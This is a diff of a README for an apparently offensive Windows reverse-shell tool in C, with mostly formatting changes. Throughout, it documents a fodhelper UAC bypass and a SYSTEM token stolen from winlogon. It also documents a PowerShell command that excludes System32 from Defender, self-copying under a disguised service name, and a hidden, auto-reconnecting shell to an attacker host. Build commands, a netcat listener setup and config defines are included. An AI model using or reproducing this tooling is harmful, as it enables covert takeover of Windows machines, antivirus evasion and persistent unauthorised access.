@@ -1,5 +1,4 @@
 <div align="center">
-
 <br/>
 <br/>
 
@@ -55,25 +54,17 @@
 
 <br/>
 
-<div align="center">
-
-## 📖 &nbsp; Navigation
-
-</div>
-
-<div align="center">
-
-[**What is a Reverse Shell?**](#-what-is-a-reverse-shell) &nbsp;·&nbsp;
-[**Files**](#-files) &nbsp;·&nbsp;
-[**Privilege Chain**](#-privilege-chain) &nbsp;·&nbsp;
-[**How It Works**](#%EF%B8%8F-how-it-works) &nbsp;·&nbsp;
-[**Building**](#%EF%B8%8F-building) &nbsp;·&nbsp;
-[**Usage**](#-usage) &nbsp;·&nbsp;
-[**Listener**](#-listener-setup) &nbsp;·&nbsp;
-[**Config**](#%EF%B8%8F-configuration) &nbsp;·&nbsp;
-[**Summary**](#-full-execution-flow)
-
-</div>
+<p align="center">
+  <a href="#-what-is-a-reverse-shell"><b>What is a Reverse Shell?</b></a> &nbsp;·&nbsp;
+  <a href="#-files"><b>Files</b></a> &nbsp;·&nbsp;
+  <a href="#-privilege-chain"><b>Privilege Chain</b></a> &nbsp;·&nbsp;
+  <a href="#%EF%B8%8F-how-it-works"><b>How It Works</b></a> &nbsp;·&nbsp;
+  <a href="#%EF%B8%8F-building"><b>Building</b></a> &nbsp;·&nbsp;
+  <a href="#-usage"><b>Usage</b></a> &nbsp;·&nbsp;
+  <a href="#-listener-setup"><b>Listener</b></a> &nbsp;·&nbsp;
+  <a href="#%EF%B8%8F-configuration"><b>Config</b></a> &nbsp;·&nbsp;
+  <a href="#-full-execution-flow"><b>Summary</b></a>
+</p>
 
 <br/>
 
@@ -87,14 +78,14 @@ A **reverse shell** inverts the traditional attacker → target connection. Inst
 
 <br/>
 
-```
+<div align="center"><pre>
   ╔═══════════════════════════╗         TCP Handshake          ╔═══════════════════════════╗
   ║      TARGET MACHINE       ║  ──────────────────────────▶  ║     ATTACKER MACHINE      ║
   ║                           ║                               ║                           ║
-  ║   reverse_shell.exe       ║◀ ─ ─ ─ PowerShell I/O ─ ─ ─ ║   nc -lvnp <PORT>         ║
+  ║   reverse_shell.exe       ║◀─ ─ ─ ─PowerShell I/O─ ─ ─ ─║   nc -lvnp <PORT>         ║
   ║   (running as SYSTEM)     ║                               ║   (full shell access)     ║
   ╚═══════════════════════════╝                               ╚═══════════════════════════╝
-```
+</pre></div>
 
 <br/>
 
@@ -107,7 +98,7 @@ A **reverse shell** inverts the traditional attacker → target connection. Inst
 <div align="center">
 
 | &nbsp; | File | Description |
-|:---:|---|---|
+|:---:|:---|:---|
 | 🔴 | `reverse_shell_system.c` | **Main payload** — UAC bypass + SYSTEM escalation + shell loop |
 | 📄 | `manifest.xml` | Windows application manifest — execution level set to `asInvoker` |
 | 🔧 | `manifest.rc` | Resource script — embeds the manifest into the compiled binary |
@@ -124,9 +115,7 @@ A **reverse shell** inverts the traditional attacker → target connection. Inst
 
 <br/>
 
-<div align="center">
-
-```
+<div align="center"><pre>
   ╔══════════════════════════════════════════════════════╗
   ║    👤  Regular User  (medium integrity)              ║
   ║        — standard desktop session                    ║
@@ -154,9 +143,7 @@ A **reverse shell** inverts the traditional attacker → target connection. Inst
   ║      — above Admin, no restrictions                  ║
   ║      — can access SAM, LSA, any process              ║
   ╚══════════════════════════════════════════════════════╝
-```
-
-</div>
+</pre></div>
 
 <br/>
 
@@ -175,7 +162,7 @@ A **reverse shell** inverts the traditional attacker → target connection. Inst
 
 > **Goal:** Elevate from a standard user to Admin **without showing any UAC prompt.**
 
-**The attack surface:** `fodhelper.exe` is a Microsoft-signed Windows binary marked `autoElevate: true` in its own manifest. When launched, Windows silently elevates it — no prompt. Crucially, before opening its UI, `fodhelper` checks a user-writable registry key for a command to run.
+**The attack surface:** `fodhelper.exe` is a Microsoft-signed Windows binary marked `autoElevate: true` in its own manifest. When launched, Windows silently elevates it — no prompt. Before opening its UI, `fodhelper` checks a user-writable registry key for a command to run:
 
 ```
 HKCU\Software\Classes\ms-settings\Shell\Open\command
@@ -185,7 +172,7 @@ HKCU\Software\Classes\ms-settings\Shell\Open\command
 
 **Execution flow:**
 
-```
+<div align="center"><pre>
 ① GetModuleFileNameA()  →  get our own full path
          │
 ② RegCreateKeyExA()     →  create the ms-settings key in HKCU
@@ -203,7 +190,7 @@ HKCU\Software\Classes\ms-settings\Shell\Open\command
 ⑦ RegDeleteTreeA()      →  wipe the ms-settings key (clean exit, no evidence)
          │
 ⑧ ExitProcess(0)        →  non-elevated instance is done
-```
+</pre></div>
 
 > **Why `asInvoker` in the manifest?**
 > A `requireAdministrator` manifest causes Windows to show a UAC prompt *before the binary runs* — killing the entire bypass. `asInvoker` starts the exe as a normal user, letting the bypass code handle elevation entirely in software.
@@ -248,7 +235,7 @@ AdjustTokenPrivileges(token, FALSE, &tp, ...);
 
 `winlogon.exe` is always running as SYSTEM. We reach in, copy its token, and make it usable for spawning new processes:
 
-```
+<div align="center"><pre>
 CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS)
         │
         ▼  enumerate all processes
@@ -272,7 +259,7 @@ DuplicateTokenEx(
         │
         ▼
    dup_token = fully usable SYSTEM token  ✓
-```
+</pre></div>
 
 <br/>
 
@@ -290,24 +277,21 @@ DuplicateTokenEx(
 **① Defender Exclusion** *(PowerShell, hidden, running as SYSTEM)*
 
 ```powershell
-powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden
-    -Command "Add-MpPreference -ExclusionPath 'C:\Windows\System32'"
+Add-MpPreference -ExclusionPath "C:\Windows\System32"
 ```
 
-Adds `C:\Windows\System32` to Windows Defender's exclusion list.
-After this, Defender will **not scan, flag, or quarantine** any file placed in System32.
-Waits 1.5 seconds for the exclusion to take effect before the next step.
+Adds `C:\Windows\System32` to Windows Defender's exclusion list — Defender will **not scan, flag, or quarantine** any file placed there. Waits 1.5 seconds for the exclusion to take effect.
 
-**② Self-Copy into System32** *(CopyFileA, running as elevated Admin)*
+**② Self-Copy into System32**
 
-```
-<current exe path>
-      │
-      ▼
+<div align="center"><pre>
+&lt;current exe path&gt;
+        │
+        ▼
 C:\Windows\System32\WindowsHostService.exe
-```
+</pre></div>
 
-Drops a copy of itself inside System32 under a name that blends in with legitimate Windows services. Overwrites if already present.
+Drops a copy under a name that blends in with legitimate Windows services. Overwrites if already present.
 
 <br/>
 
@@ -322,7 +306,7 @@ Drops a copy of itself inside System32 under a name that blends in with legitima
 
 > **Goal:** Maintain persistent access — reconnect automatically whenever the connection drops.
 
-```
+<div align="center"><pre>
 ┌─────────────────────────────────────────────────────┐
 │              RECONNECT LOOP  (∞)                    │
 │                                                     │
@@ -335,22 +319,20 @@ Drops a copy of itself inside System32 under a name that blends in with legitima
 │  ┌── Connection SUCCESS ─────────────────────────┐  │
 │  │                                               │  │
 │  │   if (system_token valid):                    │  │
-│  │       CreateProcessWithTokenW(system_token,   │  │
-│  │           "powershell.exe ...")               │  │
-│  │       → Shell runs as NT AUTHORITY\SYSTEM  🔴 │  │
+│  │       CreateProcessWithTokenW(system_token)   │  │
+│  │       → Shell runs as NT AUTHORITY\SYSTEM 🔴  │  │
 │  │                                               │  │
 │  │   else (fallback):                            │  │
 │  │       CreateProcessA("powershell.exe ...")    │  │
 │  │       → Shell runs as Administrator  🟠       │  │
 │  │                                               │  │
 │  │   stdin / stdout / stderr  ←→  socket         │  │
-│  │   WaitForSingleObject(hProcess, INFINITE)     │  │
-│  │   → shell exits  →  loop continues            │  │
+│  │   WaitForSingleObject → shell exits → loop    │  │
 │  └───────────────────────────────────────────────┘  │
 └─────────────────────────────────────────────────────┘
-```
+</pre></div>
 
-PowerShell is spawned with `CREATE_NO_WINDOW | SW_HIDE` — **completely invisible** to anyone on the machine.
+PowerShell is spawned with `CREATE_NO_WINDOW | SW_HIDE` — completely invisible to anyone on the machine.
 
 <br/>
 
@@ -366,18 +348,16 @@ PowerShell is spawned with `CREATE_NO_WINDOW | SW_HIDE` — **completely invisib
 
 <br/>
 
-> **Requirements:** [MSYS2](https://www.msys2.org/) with `mingw-w64` toolchain installed.
-> Provides both `gcc` and `windres`.
+> **Requirements:** [MSYS2](https://www.msys2.org/) with `mingw-w64` toolchain — provides both `gcc` and `windres`.
 
 <br/>
 
 ```bash
-# ── Step 1 ── Compile the manifest resource
+# Step 1 — compile the manifest resource
 windres manifest.rc -o manifest.o
 
-# ── Step 2 ── Compile and link the final binary
-gcc reverse_shell_system.c manifest.o -o reverse_shell_system.exe \
-    -lws2_32 -ladvapi32 -lshell32 -mwindows
+# Step 2 — compile and link the final binary
+gcc reverse_shell_system.c manifest.o -o reverse_shell_system.exe -lws2_32 -ladvapi32 -lshell32 -mwindows
 ```
 
 <br/>
@@ -385,11 +365,11 @@ gcc reverse_shell_system.c manifest.o -o reverse_shell_system.exe \
 <div align="center">
 
 | Flag | Links Against | Why It's Needed |
-|:---:|---|---|
+|:---:|:---|:---|
 | `-lws2_32` | `ws2_32.dll` | All Winsock2 socket functions (`WSASocket`, `connect`, `send`, etc.) |
-| `-ladvapi32` | `advapi32.dll` | Registry (`RegCreateKeyExA`), tokens (`OpenProcessToken`), privileges (`AdjustTokenPrivileges`) |
-| `-lshell32` | `shell32.dll` | `ShellExecuteA` — the only API that can launch auto-elevating binaries like `fodhelper.exe` |
-| `-mwindows` | — | Marks binary as GUI subsystem — **no console window spawns at any point** |
+| `-ladvapi32` | `advapi32.dll` | Registry, tokens, privileges (`OpenProcessToken`, `AdjustTokenPrivileges`) |
+| `-lshell32` | `shell32.dll` | `ShellExecuteA` — only API that can launch auto-elevating binaries |
+| `-mwindows` | — | GUI subsystem — **no console window spawns at any point** |
 
 </div>
 
@@ -403,7 +383,7 @@ gcc reverse_shell_system.c manifest.o -o reverse_shell_system.exe \
 
 <br/>
 
-**Default (uses hardcoded host + port from source):**
+**Default** *(host + port hardcoded in source):*
 
 ```powershell
 .\reverse_shell_system.exe
@@ -415,10 +395,8 @@ gcc reverse_shell_system.c manifest.o -o reverse_shell_system.exe \
 .\reverse_shell_system.exe <ATTACKER_IP_OR_HOST> <PORT>
 ```
 
-<br/>
-
 > [!NOTE]
-> The exe needs no arguments for normal use. Host and port are compiled in via `#define` at the top of the source file.
+> No arguments needed for normal use — host and port are compiled in via `#define` at the top of the source file.
 
 <br/>
 
@@ -430,30 +408,28 @@ gcc reverse_shell_system.c manifest.o -o reverse_shell_system.exe \
 
 <br/>
 
-> Start your listener **before** running the payload. The shell connects back on launch.
-
-<br/>
+> Start your listener **before** running the payload. The target connects back on launch.
 
 ```bash
-# ── netcat (standard) ──────────────────────────────────
+# netcat
 nc -lvnp <PORT>
 
-# ── ncat (Nmap's version — recommended) ────────────────
+# ncat (Nmap — recommended)
 ncat -lvnp <PORT>
 ```
 
 <br/>
 
-**Verify privilege immediately on connection:**
+**Verify privilege on connection:**
 
 ```powershell
-PS> whoami
-nt authority\system
+whoami
+# nt authority\system
 
-PS> whoami /priv
+whoami /priv
 # All privileges listed — SeDebugPrivilege, SeTcbPrivilege, etc.
 
-PS> whoami /groups
+whoami /groups
 # NT AUTHORITY\SYSTEM, BUILTIN\Administrators, ...
 ```
 
@@ -467,14 +443,14 @@ PS> whoami /groups
 
 <br/>
 
-Edit the defines at the top of `reverse_shell_system.c` before compiling:
+Edit these defines at the top of `reverse_shell_system.c` before compiling:
 
 <br/>
 
 <div align="center">
 
 | `#define` | Default Value | What It Controls |
-|:---:|---|---|
+|:---:|:---|:---|
 | `DEFAULT_HOST` | `example.host.of.yours` | Attacker IP or hostname to connect back to |
 | `DEFAULT_PORT` | `12345` | TCP port of the attacker's listener |
 | `RETRY_DELAY_MS` | `2000` | Milliseconds to wait between reconnect attempts |
@@ -492,9 +468,9 @@ Edit the defines at the top of `reverse_shell_system.c` before compiling:
 
 <br/>
 
-```
+<div align="center"><pre>
   double-click  reverse_shell_system.exe
-  (runs as regular user, no prompt shown)
+  (runs as regular user — no prompt shown)
           │
           ▼
   ┌─────────────────────────────────────────────────────────────────┐
@@ -505,7 +481,7 @@ Edit the defines at the top of `reverse_shell_system.c` before compiling:
   │       ▼                                                         │
   │  write HKCU ms-settings registry key                           │
   │  ShellExecuteA("fodhelper.exe")                                 │
-  │  → Windows auto-elevates fodhelper                             │
+  │  → Windows auto-elevates fodhelper (no prompt)                 │
   │  → fodhelper re-launches us as Admin ──────────────────────┐   │
   │  sleep 2s → wipe registry key → ExitProcess(0)             │   │
   └─────────────────────────────────────────────────────────────┘   │
@@ -529,7 +505,7 @@ Edit the defines at the top of `reverse_shell_system.c` before compiling:
   │     Sleep 1500ms                                                   │
   │                                                                    │
   │  ② CopyFileA:                                                      │
-  │     <this exe> → C:\Windows\System32\WindowsHostService.exe        │
+  │     this exe → C:\Windows\System32\WindowsHostService.exe          │
   └──────────────────────────────────────────────┬────────────────────┘
                                                  │
   ┌──────────────────────────────────────────────▼────────────────────┐
@@ -541,7 +517,7 @@ Edit the defines at the top of `reverse_shell_system.c` before compiling:
   │      ✓ success + no token    → PowerShell as Admin    🟠          │
   │      ✗ fail                  → sleep 2s, retry        🔄          │
   └────────────────────────────────────────────────────────────────────┘
-```
+</pre></div>
 
 <br/>
 
@@ -559,9 +535,8 @@ Edit the defines at the top of `reverse_shell_system.c` before compiling:
 
 <br/><br/>
 
-*Dexster — Reverse TCP Shell &nbsp;·&nbsp; v1 &nbsp;·&nbsp; Built in C &nbsp;❤️*
+<em>Dexster &nbsp;·&nbsp; Reverse TCP Shell &nbsp;·&nbsp; v1 &nbsp;·&nbsp; Built in C &nbsp;❤️</em>
 
 <br/>
 
 </div>
-
